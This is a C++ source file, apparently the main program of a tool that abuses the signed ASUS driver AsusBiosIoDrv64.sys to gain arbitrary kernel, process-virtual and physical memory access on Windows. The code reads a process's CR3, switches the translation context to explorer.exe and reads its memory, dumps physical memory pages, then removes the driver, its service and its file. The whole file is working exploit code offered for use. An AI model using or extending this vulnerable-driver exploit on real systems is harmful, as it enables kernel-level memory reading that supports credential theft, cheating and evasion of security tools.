//
// Abusing AsusBiosIoDrv64.sys to gain kernel and process physical/virtual memory access.
//

#include <Windows.h>
#include <winternl.h>
#include <vector>
#include <unordered_map>
#include <expected>
#include <memory>
#include <TlHelp32.h>
#include <fstream>

#include "nt.h"
#include "utils.h"

#include "loader.h"
#include "asusdrv.h"

#pragma comment(lib, "ntdll.lib")

int main()
{
	AsusBiosIoDrv64 asusIo;

    printf("\n[*] ReadVirtualMemory for kernel\n");
	uintptr_t EProcess = GetEProcess(GetCurrentProcessId());
    uintptr_t Cr3 = asusIo.Read<uintptr_t>(EProcess + 0x28);
	printf("CurrentCr3: 0x%llx\n", (unsigned long long)Cr3);

    // Switch context (translation cr3) for virtual reads to explorer.exe
	asusIo.SwitchProcessContext(L"explorer.exe");

    printf("\n[*] Virtual read bytes of explorer\n");
    uintptr_t explorerBase = GetProcessBase(L"explorer.exe");
    uint8_t buffer[40] = { 0 };
    asusIo.ReadVirtualMemory((PVOID)explorerBase, buffer, 40);
    printf("0x00: ");
    for (int i = 0; i < 40; i++) {
        printf("%02X ", buffer[i]);
    }
    printf("\n");

    // Switch context back to system (translation cr3) for virtual reads
    asusIo.SwitchSystemContext();

    Sleep(2000);

    // Test physical reads
    DumpPhysicalMemoryHex(0x1000, 0x1000 * 2, asusIo);  // 0x1000 -> 0x1000 * 2

    // Unloads and deletes driver, service and file
    asusIo.Remove();

    printf("\nPress any key to exit...");
    getchar();

	return 0;
}


